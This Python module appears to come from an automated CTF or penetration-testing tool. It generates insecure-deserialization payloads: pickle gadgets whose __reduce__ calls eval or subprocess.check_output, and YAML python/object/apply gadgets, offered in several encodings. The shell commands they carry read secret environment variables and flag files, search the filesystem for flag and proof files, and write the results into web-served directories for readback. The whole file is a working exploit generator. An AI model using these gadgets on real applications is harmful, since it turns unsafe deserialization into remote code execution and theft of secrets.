from __future__ import annotations

import base64
import json
import pickle
import subprocess

_FLAG_PATHS = (
    "/FLAG",
    "/FLAG.txt",
    "/flag",
    "/flag.txt",
    "/flag/FLAG.txt",
    "/flag/flag.txt",
    "/tmp/FLAG",
    "/tmp/FLAG.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/app/FLAG",
    "/app/FLAG.txt",
    "/app/flag",
    "/app/flag.txt",
    "/var/www/html/FLAG",
    "/var/www/html/FLAG.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/root/FLAG",
    "/root/FLAG.txt",
    "/root/flag",
    "/root/flag.txt",
)

_READBACK_DIRS = (
    "/tmp",
    "/app",
    "/app/static",
    "/static",
    "/var/www/html",
    "/var/www/html/static",
    "/usr/share/nginx/html",
)

_READBACK_FETCH = ("/{name}.txt", "/static/{name}.txt", "/static/images/{name}.txt")


def _body_deserialization_payloads(token: str) -> list[dict[str, object]]:
    payloads: list[dict[str, object]] = []
    pickle_gadgets = [
        (pickle.dumps(_PickleCheckOutput(_flag_command(token)), protocol=2), False),
        (
            pickle.dumps(
                _PickleEval(f"__import__('os').popen({_flag_command(token)!r}).read()"), protocol=2
            ),
            False,
        ),
        (pickle.dumps(_PickleCheckOutput(_readback_command(token)), protocol=2), True),
    ]
    for raw, readback in pickle_gadgets:
        payloads.append(
            {
                "kind": "pickle",
                "encoding": "base64",
                "value": base64.b64encode(raw).decode("ascii"),
                "readback": readback,
            }
        )
        payloads.append(
            {
                "kind": "pickle",
                "encoding": "urlsafe_base64",
                "value": base64.urlsafe_b64encode(raw).decode("ascii"),
                "readback": readback,
            }
        )
    yaml_gadgets: list[tuple[bytes, bool]] = []
    for payload in _yaml_gadgets(_flag_command(token))[:2]:
        yaml_gadgets.append((payload, False))
    for payload in _yaml_gadgets(_readback_command(token))[:2]:
        yaml_gadgets.append((payload, True))
    for raw, readback in yaml_gadgets:
        text = raw.decode("utf-8", errors="replace")
        payloads.append(
            {
                "kind": "yaml",
                "encoding": "raw",
                "value": text,
                "readback": readback,
            }
        )
        payloads.append(
            {
                "kind": "yaml",
                "encoding": "base64",
                "value": base64.b64encode(raw).decode("ascii"),
                "readback": readback,
            }
        )
    deduped: list[dict[str, object]] = []
    seen: set[tuple[str, str, str]] = set()
    for payload in payloads:
        key = (str(payload["kind"]), str(payload["encoding"]), str(payload["value"]))
        if key in seen:
            continue
        seen.add(key)
        deduped.append(payload)
    return deduped


# --- gadget construction (response-returning) ---------------------------------


class _PickleEval:
    def __init__(self, expression: str) -> None:
        self.expression = expression

    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (eval, (self.expression,))


class _PickleCheckOutput:
    def __init__(self, command: str) -> None:
        self.command = command

    def __reduce__(self) -> tuple[object, tuple[object]]:
        return (subprocess.check_output, (["sh", "-c", self.command],))


def _flag_command(token: str) -> str:
    commands = [
        _environment_flag_command(),
        _file_flag_command(),
        f"echo {token}",
    ]
    return "; ".join(commands)


def _environment_flag_command() -> str:
    names = (
        "FLAG",
        "flag",
        "SECRET",
        "secret",
        "APP_FLAG",
        "APP_SECRET",
        "PROOF",
        "proof",
    )

    variables: list[str] = []
    for name in names:
        variables.append(f'"${name}"')

    variable_args = " ".join(variables)
    return f'printf "%s\\n" {variable_args}'


def _file_flag_command() -> str:
    paths = " ".join(_FLAG_PATHS)
    return f"cat {paths} 2>/dev/null"


def _discovery_command(token: str) -> str:
    find_expr = (
        "find / "
        "-path /proc -prune -o -path /sys -prune -o -path /dev -prune -o "
        "\\( -iname flag -o -iname flag.txt -o -iname '*flag*' -o -iname '*proof*' \\) "
        "-type f -print 2>/dev/null | head -n 40"
    )
    return f'for p in $({find_expr}); do head -c 4096 "$p" 2>/dev/null; echo; done; echo {token}'


def _readback_command(token: str) -> str:
    redirect_commands: list[str] = []
    for directory in _READBACK_DIRS:
        redirect_commands.append(f'echo "$OUT" > "{directory}/{token}.txt" 2>/dev/null')
    redirects = "; ".join(redirect_commands)
    return f"OUT=$({_flag_command(token)}); {redirects}; echo {token}"


def _gadgets(kind: str, token: str) -> list[bytes]:
    if kind == "pickle":
        return [
            *_pickle_renderable_object_gadgets(_flag_command(token)),
            *_pickle_renderable_object_gadgets(_discovery_command(token)),
            pickle.dumps(_PickleCheckOutput(_flag_command(token)), protocol=2),
            pickle.dumps(_PickleCheckOutput(_discovery_command(token)), protocol=2),
            pickle.dumps(
                _PickleEval(f"__import__('os').popen({_flag_command(token)!r}).read()"), protocol=2
            ),
            pickle.dumps(_PickleCheckOutput(_readback_command(token)), protocol=2),
        ]
    if kind == "yaml":
        payloads: list[bytes] = []
        commands = (_flag_command(token), _discovery_command(token), _readback_command(token))
        for command in commands:
            for payload in _yaml_gadgets(command):
                payloads.append(payload)
        return payloads
    return []


def _pickle_renderable_object_gadgets(command: str) -> list[bytes]:
    name_expression = (
        "__import__('types').SimpleNamespace("
        f"name=__import__('os').popen({command!r}).read(), "
        "url='http://127.0.0.1/')"
    )
    url_expression = (
        "__import__('types').SimpleNamespace("
        "name='proof', "
        f"url=__import__('os').popen({command!r}).read())"
    )
    return [
        pickle.dumps([_PickleEval(name_expression)], protocol=2),
        pickle.dumps([_PickleEval(url_expression)], protocol=2),
    ]


def _yaml_gadgets(command: str) -> list[bytes]:
    argv = '["sh", "-c", ' + json.dumps(command) + "]"
    scalar = f"!!python/object/apply:subprocess.check_output\n- {argv}\n"
    list_item = (
        "- name: !!python/object/apply:subprocess.check_output\n"
        f"    - {argv}\n"
        '  url: "http://example.com"\n'
    )
    mapping = (
        "name: !!python/object/apply:subprocess.check_output\n"
        f"  - {argv}\n"
        'url: "http://example.com"\n'
    )
    payloads: list[bytes] = []
    for payload in (scalar, list_item, mapping):
        payloads.append(payload.encode("utf-8"))
    return payloads
